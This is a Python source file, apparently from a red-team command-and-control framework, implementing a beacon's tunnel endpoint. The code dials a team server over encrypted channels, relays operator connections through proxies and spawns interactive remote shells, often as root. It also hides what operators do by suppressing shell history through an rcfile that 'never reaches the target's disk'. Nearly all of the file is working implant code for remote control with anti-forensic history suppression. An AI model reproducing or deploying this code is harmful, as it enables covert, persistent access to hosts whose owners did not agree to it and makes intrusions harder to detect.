                 'export LSCOLORS="${LSCOLORS:-ExFxCxDxBxegedabagacad}"\n'
                 '[ -f /etc/bash.bashrc ] && . /etc/bash.bashrc\n'
                 'declare -F _completion_loader >/dev/null 2>&1 ||'
                 ' for _rc_bc in /etc/profile.d/bash_completion.sh'
                 ' /usr/share/bash-completion/bash_completion'
                 ' /etc/bash_completion; do\n'
                 '  [ -r "$_rc_bc" ] && { . "$_rc_bc"; break; }\n'
                 'done\n'
                 'unset _rc_bc\n'
                 + r"PS1='\[\e[38;2;255;26;26m\]\h:\w\$\[\e[0m\] '" + '\n'
                 '[ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"\n'
                 'unset HISTFILE\n'
                 'set +o history\n')


def _shell_modules():
    """The POSIX modules a PTY session needs, imported on the way in.

    Lazily, and in one place. `pty`, `fcntl` and `termios` do not exist
    on Windows and this file has to stay importable there -- a beacon on
    a Windows host has everything else to do -- so the import is here
    rather than at the top, and a host that cannot satisfy it refuses the
    session in plain text on the stream instead of failing opaquely.
    `select` and `signal` ride along because they are used only on this
    same POSIX path: `signal.SIGHUP` and `os.killpg` have no meaning
    without it.

    It is also the one seam a test can replace to produce such a host,
    which is not a condition a test can otherwise arrange.
    """
    import fcntl
    import pty
    import select
    import signal
    import termios
    return pty, fcntl, termios, select, signal


def _shell_executable(path: str) -> bool:
    """Whether `path` is something this process can execute.

    A function of its own for the same reason `_dial_target` is one: a
    host without bash is not a condition a test can arrange, and what is
    worth testing is the choice made from this answer rather than
    `os.access` itself.
    """
    return os.access(path, os.X_OK)


def _login_shell() -> str:
    """The effective user's login shell if it is one this can drive, else "".

    The passwd entry and not `$SHELL`: under the shipped
    `services/raccoon-beacon.service` the environment is the service
    manager's, so `$SHELL` there is nobody's choice, and a test pins that
    this function never reads it. The unit runs as root, which makes "the
    login shell" root's -- on most Linux hosts `/bin/bash`, so the
    behaviour is unchanged there. What this helps is the operator's own
    machine, which is the device the feature is for: their prompt,
    colours and completion live in the rc files of the shell they chose,
    and a different shell never reads them.

    Only bash and zsh are answered, by basename. bash is the shell the
    rcfile construction is written and tested for. zsh is run as plain
    `zsh -i`, which is what it was seen to do in one unpinned run of this
    file on macOS; no test drives a zsh session. fish and tcsh take
    neither `--rcfile` nor bash's `-i` semantics, and an untested flag
    costs a session that dies on the spot.

    The entry must be an absolute path to a regular file that can be
    executed. `os.access` says yes for a directory, and for a relative
    name it resolves against this process's working directory while
    `Popen` searches `PATH`, so either would be a probe about something
    other than what runs, and a session that exits instantly. The
    effective uid, as in `_process_user`, because that is the one a
    session would run with. `""` on any failure, a shell that is not
    there, or one not driven: the caller has a preference of its own, and
    a lookup that fails must cost the choice and never the whole
    connection.
    """
    try:
        if platform.system() == "Windows":
            return ""
        import pwd
        shell = pwd.getpwuid(os.geteuid()).pw_shell
        if (os.path.isabs(shell) and os.path.isfile(shell)
                and os.path.basename(shell) in _LOGIN_SHELLS
                and _shell_executable(shell)):
            return shell
        return ""
    except Exception:
        return ""


def _shell_program() -> str:
    """The shell a session runs: the login shell, else bash, else `/bin/sh`.

    The user's own login shell first when it is bash or zsh, because the
    point of the session is that the prompt, colours and completion are
    theirs, and those live in the rc files of the shell they chose.

    Otherwise bash where there is one, because the point of the session
    is the host's own line editing and completion, and `bash-completion`
    is what knows `nmap`'s flags. `/bin/sh` is the floor every POSIX host
    has: a session without completion still beats one command per
    check-in.
    """
    return (_login_shell()
            or (_SHELL_BASH if _shell_executable(_SHELL_BASH)
                else _SHELL_SH))


def _setsid_program() -> str:
    """`setsid(1)`'s path, or `""` where the host has none.

    Probed rather than assumed, the way the shell is, because it is the
    same question about a host and the answer picks between two
    documented paths -- see `_SETSID_PATHS` for which and why.
    """
    for path in _SETSID_PATHS:
        if _shell_executable(path):
            return path
    return ""


def _shell_rcfile_fd() -> int:
    """The read end of a pipe holding `_SHELL_RCFILE`.

    Nothing reaches the target's disk: the rcfile is the contents of a
    pipe, which the child opens as `/dev/fd/<n>`. The text is a few
    dozen bytes, far inside a pipe's buffer, so the write completes
    before there is anybody to read it and the write end can be closed
    straight away -- no thread to hold it open, and no way for this to
    block on a reader that never arrives.

    The caller closes the descriptor returned once the child holds its
    own copy.
    """
    read_fd, write_fd = os.pipe()
    try:
        os.write(write_fd, _SHELL_RCFILE.encode("utf-8"))
    except OSError:
        _close_fd(read_fd)
        raise
    finally:
        _close_fd(write_fd)
    return read_fd


class _HistoryPipeError(OSError):
    """The pipe that carries the generated rcfile could not be made.

    What `_shell_invocation` raises, and the only thing `_serve_shell`
    reads as "history cannot be held off for this session".
    """


class _HistoryGuardChanged(Exception):
    """A session's history guard is not the one that was reported.

    `_hello` reports `_history_guard()` once, when the tunnel connects,
    because what reads it is a panel looking at an endpoint row rather
    than at a session. Half of that answer cannot go stale -- `/dev/fd`
    does not come and go under a running service -- and the other half
    can: `chsh`, or a bash removed or made non-executable, takes effect on
    the next session of an endpoint that has been connected for months.

    So the guard is remembered and checked again where a session is built,
    and this is what a disagreement raises rather than running the session
    under a claim nobody has rechecked. `_serve_shell` turns it into a
    refusal that shows both answers.

    Not `_HistoryPipeError` and not an `OSError`: nothing here failed, and
    that one's refusal reads an errno off the error to decide what to
    advise. Two causes with two different things to do about them are two
    types, so that each `except` picks exactly one of them.
    """

    def __init__(self, reported: Tuple[str, str], now: Tuple[str, str]):
        Exception.__init__(
            self, "reported %r when the tunnel connected and would be %r "
                  "now" % (reported, now))
        self.reported = reported
        self.now = now


def _guard_of(program: str) -> Tuple[str, str]:
    """`_history_guard`'s answer for a shell already chosen.

    Separate so that `_shell_invocation` can ask about the program it is
    about to run and not about whatever the passwd entry says a moment
    later. Bash is recognised by basename, as `_login_shell` recognises
    it: the chooser accepts `/usr/local/bin/bash`, and a path comparison
    here would call that "not bash" and withhold the rcfile from it.
    """
    if os.path.basename(program) != os.path.basename(_SHELL_BASH):
        # An operator reads this on the page's first line, so it says what
        # cannot be done and not which flag is missing: only bash takes
        # `--rcfile`.
        return "weak", "%s cannot be given a startup file of ours" % program
    if not os.path.isdir(_DEV_FD):
        return "weak", ("this host has no %s to hand a pipe to bash on"
                        % _DEV_FD)
    return "off", ""


def _history_guard() -> Tuple[str, str]:
    """How history is held off in a session here: `(guard, why)`.

    `("off", "")` where the generated rcfile described at `_SHELL_RCFILE`
    is used: the shell is bash and the host has a `/dev/fd` to hand it a
    pipe on. Otherwise `("weak", reason)` and the session sets
    `HISTFILE=/dev/null` in the environment, which the user's own rc files
    run after and are free to undo.

    The two reasons differ in how long they hold. `/dev/fd` is the
    host's, and does not change under a running service. "Not bash" is
    the login shell's, and that can: `chsh`, or a bash removed or made
    non-executable, takes effect on the next session of a service that
    has run for months. So an answer given once is not good for ever, and
    a caller that reports it once has to notice when a session's guard no
    longer matches. The reason says which it was -- the shell, or the host
    -- because the operator can do something about one and not the other.
    A pipe that cannot be opened is not here: that is per attempt, and it
    refuses the session.
    """
    return _guard_of(_shell_program())


def _shell_invocation(cols: int, rows: int,
                      reported: Optional[Tuple[str, str]] = None
                      ) -> Tuple[list, dict, tuple]:
    """What to run for a PTY session: argv, environment, descriptors.

    The environment is this process's own plus the terminal the session
    is: `TERM`, because a session without one has no cursor keys and no
    completion display, and `COLUMNS`/`LINES`, because readline reads
    them before it has seen a window-size change.

    History is held off with the generated rcfile described at
    `_SHELL_RCFILE`. `_history_guard` says where that is not available --
    a shell that is not bash, or a host with no `/dev/fd` -- and there the
    session falls back to `HISTFILE=/dev/null` in the environment and logs
    that it took the weaker path, because the host's own rc files run
    after that and are free to set `HISTFILE` again. Of those two,
    `/dev/fd` is the host's and stable, and the shell is the login shell's
    and is not: see `_history_guard`.

    `reported` is the answer this endpoint has already told the server
    about -- `_history_guard()`'s pair, carried by its HELLO. Given one, a
    session whose answer is not it is not built at all:
    `_HistoryGuardChanged` is raised and the caller refuses, because a
    panel is showing the reported word and its reason to somebody. The
    pair and not the word: a login shell that went from zsh to fish is
    "weak" both times, and a panel that goes on saying that zsh takes no
    `--rcfile` over a fish session says something false. The comparison is
    here rather than at the caller so that it is about the program this
    chose, out of this one passwd lookup; a caller asking
    `_history_guard()` for itself would be the second lookup. `None` is a
    caller that has reported nothing and so has nothing to contradict.

    A pipe that cannot be opened is neither. It is a moment's shortage of
    descriptors on a host that otherwise would have held history off, and
    falling back would record the operator's commands while everything
    they were shown said it did not. It propagates as `_HistoryPipeError`,
    an `OSError`, and the caller refuses the session. A class of its own,
    so that any other `OSError` from here is not taken for this one.

    `--rcfile` comes before `-i`: bash 3.2 stops reading long options
    after the first short one and answers `--: invalid option`, which
    would be a session that exits instantly on macOS and runs on Linux.

    The third element is the descriptors the child needs; the caller
    closes every one of them once the child is spawned.
    """
    program = _shell_program()
    env = dict(os.environ)
    env["TERM"] = _SHELL_TERM
    env["COLUMNS"] = str(cols)
    env["LINES"] = str(rows)
    guard, weaker = _guard_of(program)
    if reported is not None and (guard, weaker) != reported:
        raise _HistoryGuardChanged(reported, (guard, weaker))
    if guard != "off":
        env["HISTFILE"] = os.devnull
        logger.info("tunnel: a shell session is holding history off with "
                    "HISTFILE=%s rather than a generated rcfile: %s",
                    os.devnull, weaker)
        return [program, "-i"], env, ()
    try:
        rc_fd = _shell_rcfile_fd()
    except OSError as exc:
        raise _HistoryPipeError(*exc.args) from exc
    return ([program, "--rcfile", "%s/%d" % (_DEV_FD, rc_fd), "-i"],
            env, (rc_fd,))


def _shell_geometry(value, default: int) -> int:
    """One terminal dimension from a message, inside `1..` the bound.

    Anything that is not an integer -- absent, a string, a float, `true`
    -- takes the default, and a number outside the bounds is clamped
    rather than refused: an operator on a 300-column terminal should get
    300 columns, and one whose client sent 99999 should get a session
    rather than an error. The bound is the codec's, shared with the front
    that asks for the session, because an `ioctl` is the wrong place to
    discover that the two ends disagree about what a terminal can be.
    """
    if isinstance(value, bool) or not isinstance(value, int):
        return default
    return max(1, min(SHELL_GEOMETRY_MAX, value))


def _write_all(fd: int, data: bytes, live, select_mod) -> bool:
    """Every byte of `data` to `fd`, or False once `live()` says stop.

    `sendall`'s loop, which a socket has and a descriptor does not --
    plus a readiness wait a socket would not need here, which is the
    other half of the asymmetry `_SHELL_POLL` describes.

    Writing to a PTY master fills the *slave's input queue*, and that
    queue is a few kilobytes that only the foreground command drains. A
    command that is not reading its stdin -- a capture, a `sleep` --
    leaves it full, so a blocking write of one pasted line would park
    this thread until that command happened to read, which may be never.
    It is also the thread that runs the session's teardown, so parking
    here would mean a dead stream whose child, master and threads were
    all still alive: exactly what must not outlive a session. Hence a
    non-blocking master (`_serve_shell` sets it), `select` for room, and
    `live()` on every pass, as the read direction does.

    False means the session ended mid-write, and the rest of `data` is
    dropped: the last keystrokes of a session that is already over.
    """
    view = memoryview(data)
    while view:
        if not live():
            return False
        if not select_mod.select([], [fd], [], _SHELL_POLL)[1]:
            continue
        try:
            view = view[os.write(fd, view):]
        except BlockingIOError:
            # Readiness is not a reservation: another pass.
            continue
    return True


def _close_fd(fd: int) -> None:
    """Drop a descriptor now, raising nothing. `_shut_socket` for an fd."""
    try:
        os.close(fd)
    except OSError as exc:
        logger.debug("tunnel: could not close descriptor %d: %s", fd, exc)


class _TunnelChannel(object):
    """The endpoint's command channel: its socket, Noise session and lock.

    Writes take the lock, and the lock covers `encrypt` as well as the
    bytes. Two threads write here -- the command loop answering a PING
    with a PONG, and the keep-alive thread sending one of its own -- and
    `write_frame`'s single `sendall` does not serialise them: it loops
    over partial sends and releases the GIL. The nonce `encrypt` advances
    has to be ordered with the frame it produced, so both are inside.
    """

    def __init__(self, sock: socket.socket, noise: NoiseSession):
        self.sock = sock
        self.noise = noise
        self.last_seen = time.monotonic()
        self.last_ping = self.last_seen
        self._write_lock = threading.Lock()
        # A lock of its own for the closed flag, held across nothing. The
        # write lock cannot serve: `send` holds that one across a blocking
        # `sendall`, and `close` has to be able to run then.
        self._state_lock = threading.Lock()
        self._closed = False

    def send(self, kind: int, body: dict) -> None:
        """One command message, under the lock that orders the nonce too."""
        with self._write_lock:
            if self._closed:
                raise OSError("this command channel is closed")
            write_frame(self.sock,
                        self.noise.encrypt(encode_message(kind, body)))

    def touch(self) -> None:
        self.last_seen = time.monotonic()

    @property
    def closed(self) -> bool:
        return self._closed

    def close(self) -> None:
        """Shut the channel down. Never waits on a write in flight."""
        with self._state_lock:
            if self._closed:
                return
            self._closed = True
        _shut_socket(self.sock)


def _process_user() -> Optional[str]:
    """The account a shell session spawned here would run as, or None.

    The panel warns an operator about the rights a session carries, and
    those are this process's: root when the endpoint came up from the
    service unit, some unprivileged account when a generated build was
    started by hand. Nothing on the team server can work that out, so the
    endpoint reports it the way it reports its own hostname.

    The effective uid rather than the real one, because that is the one a
    session spawned here would run with. `None` on any failure -- a HELLO
    that cannot be built costs the whole tunnel, and a missing name only
    costs the panel a sentence it already has a wording for.
    """
    try:
        if platform.system() != "Windows":
            import pwd
            return pwd.getpwuid(os.geteuid()).pw_name
        return os.environ.get("USERNAME") or None
    except Exception:
        return None


class TunnelEndpoint(object):
    """The far end of the tunnel: one command channel, one relay per request.

    `config` is a beacon config and the block read is `c2.tunnel`, which
    carries `server`, `port`, `public_key`, `psk`, `identity` and
    optionally `keepalive_seconds`, `connect_timeout_seconds`,
    `implant_id` and `allow_slow_crypto`. A config this class cannot run
    is a `ValueError` naming the field, from `tunnel_config_problem`.
    `implant_id` falls back to `_TUNNEL_IMPLANT_ENV`, which is how a
    beacon's child learns an id that did not exist when its block was
    written.
    `c2.proxy` is read too, and it is the same block the beacon's own
    transports use: one host has one way out.

    `run()` blocks until `stop()`, reconnecting on the beacon's backoff;
    `status()` is a row for an operator panel.
    """

    def __init__(self, config: dict):
        problem = tunnel_config_problem(config)
        if problem:
            raise ValueError(problem)
        c2 = config.get("c2") if isinstance(config, dict) else None
        tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
        if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
            raise ValueError(
                "c2.tunnel.enabled is not set: this config asks for no "
                "tunnel, and an endpoint with nothing to dial is not one")
        self.server = tunnel["server"].strip()
        self.port = int(tunnel["port"])
        self.identity = tunnel["identity"].strip()
        self._public = _tunnel_key(tunnel.get("public_key"),
                                   "c2.tunnel.public_key",
                                   "the tunnel server's static X25519 "
                                   "public key")
        self._psk = _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
                                "this build's pre-shared key")
        implant_id = tunnel.get("implant_id")
        implant_id = implant_id.strip() if isinstance(implant_id, str) else ""
        # The config wins; see `_TUNNEL_IMPLANT_ENV` for why there is a
        # second source at all. Blank is absent on both sides, so a config
        # that carries the key empty cannot shadow the variable the beacon
        # set.
        self.implant_id = (implant_id
                           or os.environ.get(_TUNNEL_IMPLANT_ENV, "").strip())
        self.keepalive_interval = _tunnel_seconds(
            tunnel.get("keepalive_seconds"), _DEFAULT_KEEPALIVE)
        # Three keep-alives missed before the server is declared gone,
        # which is the rule the server applies to this end: one lost PING
        # on a bad link should not cost a tunnel.
        self.idle_timeout = 3 * self.keepalive_interval
        self.connect_timeout = _tunnel_seconds(
            tunnel.get("connect_timeout_seconds"), _DEFAULT_CONNECT_TIMEOUT)
        self.allow_slow_crypto = bool(tunnel.get("allow_slow_crypto"))

        proxy = c2.get("proxy")
        proxy = proxy if isinstance(proxy, dict) else {}
        self.proxy_mode = str(proxy.get("mode") or "auto")
        self.proxy_url = str(proxy.get("url") or "")
        ntlm = proxy.get("ntlm")
        self._proxy_ntlm = ntlm if isinstance(ntlm, dict) else {}

        self._lock = threading.Lock()
        # Write-once: `run` never clears it. A `stop` that lands before
        # `run` -- including the whole window between a caller's
        # `thread.start()` and `run`'s first line, which is milliseconds
        # under load -- has to be the one that wins, and a flag `run`
        # could clear would erase it and leave the reconnect loop running
        # for ever. So one `TunnelEndpoint` is one `run`: the keep-alive
        # and both relay directions read this same event, and supporting
        # a restart would mean threading a generation number through all
        # of them for a caller nothing has asked for. Task 8 constructs a
        # fresh endpoint per child, which is the shape that wants.
        self._stop = threading.Event()
        self._channel = None        # type: Optional[_TunnelChannel]
        self._connected = False
        self._failures = 0
        # The way out that worked, so a relay does not re-walk the list.
        # `None` is a valid route -- direct -- so "not known yet" needs a
        # flag of its own rather than a sentinel value.
        self._route = None
        self._route_known = False
        self._discovered = None     # type: Optional[list]
        self._ntlm_relay = None     # type: Optional[_NtlmProxyRelay]
        # Every socket a relay holds, so `stop` can unpark a pump instead
        # of waiting for one to notice.
        self._relay_sockets = set()
        self._relay_threads = []    # type: list
        self._sessions = 0
        self._carried = 0
        # Shell sessions only, which `_sessions` cannot serve: that one
        # counts relays too, and the cap is on the ones that cost a
        # process and a PTY.
        self._shells = 0
        # The history guard, word and reason, that the last HELLO
        # reported, so that a session whose guard is no longer that one
        # can be refused rather than run while a panel states the old
        # answer. `None` until a HELLO has been built: nothing has been
        # claimed yet, so there is nothing to contradict.
        self._reported_history = None   # type: Optional[Tuple[str, str]]

    # ── lifecycle ──

    def run(self) -> None:
        """Hold a command channel open, reconnecting until `stop`. Blocks.

        Called once per instance: a `stop` is final, because the flag it
        sets is also what the keep-alive and both relay directions watch.

        Refuses to start on the pure-Python cipher unless told otherwise.
        Pure-Python AES-GCM moves roughly 50-200 KB/s, which is fine for
        the small messages the rest of this file sends and useless for a
        tunnel -- and "it is slow" would otherwise be diagnosed for hours
        as a network fault, because every other sign is of a working
        tunnel. The override exists because a tunnel at 100 KB/s still
        beats no tunnel when that is the decision an operator wants to
        make.
        """
        if _USE_PURE_PYTHON_AES and not self.allow_slow_crypto:
            raise RuntimeError(
                "this host has no libcrypto, so AES-256-GCM runs in pure "
                "Python at roughly 50-200 KB/s. That is enough for the "
                "beacon's own messages and not for a tunnel: every session "
                "would look like a slow network for as long as anybody "
                "cared to look. Install OpenSSL, or set "
                "c2.tunnel.allow_slow_crypto to run on the slow path "
                "deliberately.")
        if self._stop.is_set():
            # A `stop` that landed before this line, which is a caller
            # that changed its mind during thread start-up. It wins: the
            # flag is write-once and this returns without dialling.
            logger.info("tunnel: endpoint %r was stopped before it started",
                        self.identity)
            return
        logger.info("tunnel: endpoint %r dialling %s:%d, crypto %s",
                    self.identity, self.server, self.port,
                    self._crypto_path())
        while not self._stop.is_set():
            try:
                self._control_session()
            except (OSError, ValueError) as exc:
                # Everything a dead server, a proxy that stopped answering
                # or a refused handshake can cause arrives here, and the
                # answer to all of it is the same: wait, and dial again.
                logger.info("tunnel: the command channel to %s:%d did not "
                            "last: %s", self.server, self.port, exc)
            except Exception:
                # This loop is the whole endpoint: an exception that got
                # out would be a tunnel that silently stopped existing.
                logger.exception("tunnel: unexpected error on the command "
                                 "channel")
            self._failures += 1
            if self._stop.is_set():
                break
            self._retry_sleep()
        logger.info("tunnel: endpoint %r stopped", self.identity)

    def stop(self) -> None:
        """Stop reconnecting and drop everything. Safe before `run`, twice.

        Final, and before `run` as well as during it: the flag is never
        cleared, so a `stop` that arrives while a caller is still getting
        `run` onto a thread makes that `run` return without dialling,
        rather than being erased by it.

        Every socket is shut down rather than only closed: a pump parked
        in a read, or in a send that TCP backpressure has stopped, does
        not wake on a bare close on every platform, and this must not wait
        for one to notice on its own.
        """
        self._stop.set()
        with self._lock:
            channel = self._channel
            # Cleared here and not left to the command loop's own
            # unwinding: `stop` has just closed the channel, so a
            # `status` read immediately afterwards would otherwise report
            # an endpoint that is connected to a socket it no longer has.
            # The command loop clears it again on its way out, which is
            # idempotent.
            self._connected = False
            self._channel = None
            sockets = list(self._relay_sockets)
            threads = list(self._relay_threads)
            relay, self._ntlm_relay = self._ntlm_relay, None
            self._relay_sockets = set()
            self._relay_threads = []
        if channel is not None:
            channel.close()
        for sock in sockets:
            # Shut down and not closed: the relay thread that owns each of
            # these is the one that closes it.
            _shutdown_socket(sock)
        for thread in threads:
            thread.join(timeout=_TUNNEL_JOIN_TIMEOUT)
        if relay is not None:
            relay.stop()

    def status(self) -> dict:
        """One row's worth of what this endpoint is doing.

        `crypto` is read through the module rather than copied at
        construction, because it is what an operator checks when a tunnel
        is inexplicably slow and it has to be the truth now. `egress` is
        `None` until something has connected, because until then which way
        out works is not known rather than direct.

        `sessions` is what is open now and `carried` is everything since
        this endpoint started: the first drops back to zero when a relay
        closes, and a row that reported only that would tell an operator
        nothing had ever gone through an endpoint that had just carried a
        scan.
        """
        egress = self._egress()
        with self._lock:
            connected = self._connected
            sessions = self._sessions
            carried = self._carried
        return {
            "identity": self.identity,
            "server": self.server,
            "port": self.port,
            "connected": connected,
            "sessions": sessions,
            "carried": carried,
            "egress": egress,
            "crypto": self._crypto_path(),
            "slow_crypto_allowed": self.allow_slow_crypto,
        }

    # ── the command channel ──

    def _control_session(self) -> None:
        """One command channel, from the handshake to its last frame."""
        sock = self._dial(self.port)
        channel = None
        keeper = None
        try:
            noise = self._handshake(
                sock, encode_message(MSG_HELLO, self._hello()))
            channel = _TunnelChannel(sock, noise)
            with self._lock:
                self._channel = channel
                self._connected = True
                # Reset here and not on the dial: a connection that
                # authenticated is what proves the way out works, and a
                # TCP connect that is accepted and then refused would
                # otherwise reset the backoff on every attempt.
                self._failures = 0
            logger.info("tunnel: endpoint %r registered with %s:%d over %s",
                        self.identity, self.server, self.port, self._egress())
            keeper = threading.Thread(target=self._keepalive_loop,
                                      args=(channel,), name="tunnel-keepalive",
                                      daemon=True)
            try:
                keeper.start()
            except RuntimeError as exc:
                # The process has no more threads to give. Not fatal: the
                # server pings this end too and a PONG is answered from
                # the loop below, so the channel survives without a
                # keep-alive of its own -- it just takes the server's
                # idle timeout rather than ours to notice a dead link.
                keeper = None
                logger.warning("tunnel: no thread for the keep-alive (%s); "
                               "relying on the server's", exc)
            self._control_loop(channel)
        finally:
            with self._lock:
                self._connected = False
                self._channel = None
            if channel is not None:
                channel.close()
            else:
                _shut_socket(sock)
            if keeper is not None:
                keeper.join(timeout=_TUNNEL_JOIN_TIMEOUT)

    def _hello(self) -> dict:
        """The HELLO body: which build this is, and what host it is on.

        `identity` is asserted as well as proved, because the server
        refuses a connection whose HELLO disagrees with the PSK that
        authenticated it: a build free to claim another's identity would
        be a SOCKS port pointing at a different network than the operator
        believes. `implant_id` is sent only when the config or the
        `_TUNNEL_IMPLANT_ENV` variable a beacon sets supplies one -- an
        endpoint started from systemd has neither, has no beacon above it,
        and the server reports that as unlinked rather than hiding the row.

        `crypto` is here because it is the one performance fact that
        never leaves this host otherwise, and the panel is where it is
        read. An endpoint running on the pure-Python cipher -- which
        takes an explicit override to reach -- moves roughly 50-200 KB/s,
        and "a scan through this tunnel is slow" is otherwise debugged as
        a fault in the target's own network for an afternoon. The server
        knows its own path and cannot know this one.

        `features` is what this build can do besides relay, so the server
        can tell an endpoint that has a shell from one built before it
        did. A HELLO without the field is a build that predates it.

        `history` and `history_detail` are what a session on this host
        would do about the operator's command history, from
        `_history_guard`: `"off"` and `""`, or `"weak"` and the reason.
        Reported here, once, because what reads it is a panel looking at
        this endpoint's row rather than at a session, and a page that
        cannot ask states a constant instead -- which was wrong on every
        host whose login shell is not bash. The guard is remembered as
        well as sent: half of it can go stale while this endpoint stays
        connected, and a session whose guard no longer matches what was
        reported is refused rather than run under it. See
        `_HistoryGuardChanged`.
        """
        guard, weaker = _history_guard()
        body = {"identity": self.identity,
                "hostname": platform.node(),
                "os": "%s %s" % (platform.system(), platform.release()),
                "user": _process_user(),
                "history": guard,
                "history_detail": weaker,
                "crypto": self._crypto_path(),
                "features": list(TUNNEL_FEATURES)}
        if self.implant_id:
            body["implant_id"] = self.implant_id
        # Last, so that what is remembered is what is about to be sent and
        # nothing after this line can make the two differ.
        with self._lock:
            self._reported_history = (guard, weaker)
        return body

    def _control_loop(self, channel: _TunnelChannel) -> None:
        """Read and act on command messages until the channel ends."""
        sock = channel.sock
        # A poll, not the idle timeout: the deadline is measured against
        # `last_seen` below so that `stop` does not have to wait one out.
        poll = min(_CONTROL_POLL, self.keepalive_interval)
        sock.settimeout(poll)
        while not self._stop.is_set():
            try:
                waiting = _bytes_waiting(sock)
            except socket.timeout:
                if time.monotonic() - channel.last_seen < self.idle_timeout:
                    continue
                # Not an error and not a malformed peer: nothing has
                # arrived for three keep-alives, so the server is gone.
                logger.info("tunnel: %s:%d went quiet for %.1fs; dialling "
                            "again", self.server, self.port, self.idle_timeout)
                return
            except OSError as exc:
                logger.debug("tunnel: the command channel ended: %s", exc)
                return
            if not waiting:
                # A FIN between frames: an orderly teardown, and the only
                # way to tell it from a truncated frame, which `read_frame`
                # reports with the same exception type.
                logger.info("tunnel: %s:%d closed the command channel",
                            self.server, self.port)
                return
            try:
                frame = read_frame(sock)
            except socket.timeout:
                # Bytes arrived and then stopped mid-frame. Bounded by the
                # poll above, and dropped rather than waited on.
                logger.debug("tunnel: %s:%d stalled mid-frame",
                             self.server, self.port)
                return
            except OSError as exc:
                logger.debug("tunnel: the command channel ended: %s", exc)
                return
            except ValueError as exc:
                # Reached only with bytes in hand, so this is a frame that
                # was wrong rather than a peer that left.
                logger.warning("tunnel: a malformed frame from %s:%d: %s",
                               self.server, self.port, exc)
                return
            try:
                payload = channel.noise.decrypt(frame)
            except ValueError as exc:
                # Noise §5.1: abandon the session after a decrypt failure.
                # `NoiseSession` leaves that policy to its caller, which is
                # here, so the connection goes.
                logger.warning("tunnel: a frame from %s:%d did not "
                               "authenticate (%s); dropping the channel",
                               self.server, self.port, exc)
                return
            try:
                kind, body = decode_message(payload)
            except ValueError as exc:
                logger.warning("tunnel: an undecodable message from %s:%d: "
                               "%s", self.server, self.port, exc)
                return
            channel.touch()
            if kind == MSG_OPEN_RELAY:
                self._spawn_relay(body)
            elif kind == MSG_OPEN_SHELL:
                self._spawn_shell(body)
            elif kind == MSG_PING:
                try:
                    channel.send(MSG_PONG, {})
                except (OSError, ValueError) as exc:
                    logger.debug("tunnel: could not answer a PING: %s", exc)
                    return
            elif kind == MSG_PONG:
                continue
            elif kind == MSG_CLOSE:
                logger.info("tunnel: %s:%d asked to close the command "
                            "channel", self.server, self.port)
                return
            else:
                # HELLO and RELAY both mean the far end has lost track of
                # which direction it is talking in.
                logger.warning("tunnel: %s:%d sent %s on an established "
                               "channel", self.server, self.port,
                               MESSAGE_KIND_NAMES.get(kind, kind))
                return

    def _keepalive_loop(self, channel: _TunnelChannel) -> None:
        """Send a PING when nothing has arrived for a keep-alive interval.

        The server pings too, and either side's PING is answered with a
        PONG by the other, so one interval of silence in either direction
        is enough to find a connection that has died without a FIN -- a
        proxy that recycled an idle tunnel, a NAT that dropped the
        mapping. A thread of its own rather than the command loop's poll,
        so a slow frame cannot delay the clock, and it is why
        `_TunnelChannel.send` holds a lock.
        """
        tick = max(_KEEPALIVE_TICK_FLOOR,
                   min(_KEEPALIVE_TICK_CEILING, self.keepalive_interval / 2.0))
        try:
            while not self._stop.wait(tick):
                if channel.closed:
                    return
                now = time.monotonic()
                if (now - channel.last_seen < self.keepalive_interval
                        or now - channel.last_ping < self.keepalive_interval):
                    continue
                channel.last_ping = now
                try:
                    channel.send(MSG_PING, {})
                except (OSError, ValueError) as exc:
                    # The command loop owns the reconnect; closing the
                    # socket is what tells it to let go.
                    logger.debug("tunnel: keep-alive failed: %s", exc)
                    channel.close()
                    return
        except Exception:
            logger.exception("tunnel: unexpected error in the keep-alive")
            channel.close()

    def _retry_sleep(self) -> None:
        """Wait before dialling again, on the beacon's own backoff shape.

        `_stop.wait` rather than `time.sleep`, so a `stop` does not have
        to sit out a delay that reaches five minutes.
        """
        delay = min(_TUNNEL_RETRY_BASE * (1.5 ** self._failures),
                    _TUNNEL_RETRY_CEILING)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("tunnel: next attempt in %.1fs (failures=%d)",
                     delay, self._failures)
        self._stop.wait(delay)

    # ── relays ──

    def _spawn_relay(self, body: dict) -> None:
        """Dial the relay the server has just asked for, on its own thread.

        The port in the message is **not** where the relay goes. The
        server names the port it bound locally, and that is only the port
        this host can reach when nothing sits in between: behind a
        redirector, a NAT or any port translation, the configured port is
        443 and the server's own is something else, so dialling what was
        advertised would fail every relay while the command channel
        stayed healthy -- the panel reading `connected` and every session
        timing out. The port this endpoint was configured with is the one
        that demonstrably works, because the handshake that carried this
        message came back through it. One destination is also what makes
        a single `CONNECT` rule enough, which is the whole reason the
        protocol has one port. So the field is read and logged when it
        differs, and never acted on.
        """
        token = body.get("token")
        advertised = body.get("port")
        if not isinstance(token, str) or not token:
            logger.warning("tunnel: an OPEN_RELAY carrying no token; ignored")
            return
        if advertised != self.port:
            logger.debug("tunnel: an OPEN_RELAY advertised port %r; this "
                         "endpoint dials its configured %d",
                         advertised, self.port)
        thread = threading.Thread(target=self._relay, args=(token,),
                                  name="tunnel-relay", daemon=True)
        with self._lock:
            self._relay_threads = [t for t in self._relay_threads
                                   if t.is_alive()]
            self._relay_threads.append(thread)
        try:
            thread.start()
        except RuntimeError as exc:
            # The process has no more threads to give. The operator's end
            # is told by the session never pairing, which is what it is
            # already waiting on.
            with self._lock:
                if thread in self._relay_threads:
                    self._relay_threads.remove(thread)
            logger.warning("tunnel: no thread could be started for a relay: "
                           "%s", exc)

    def _relay(self, token: str) -> None:
        """One relay: dial the same port, claim it with the token, serve it."""
        sock = None
        try:
            sock = self._dial(self.port)
            self._register_socket(sock)
            noise = self._handshake(
                sock, encode_message(MSG_RELAY, {"token": token}))
            self._serve_relay(sock, noise)
        except (OSError, ValueError) as exc:
            # A relay that could not be dialled, a token the server no
            # longer holds, a frame that did not authenticate, a session
            # the operator closed: all of it costs this one relay, and the
            # operator's end learns of it from the session never pairing
            # or from the stream ending.
            logger.info("tunnel: a relay to %s:%d ended: %s",
                        self.server, self.port, exc)
        except Exception:
            logger.exception("tunnel: unexpected error on a relay")
        finally:
            if sock is not None:
                self._forget_socket(sock)
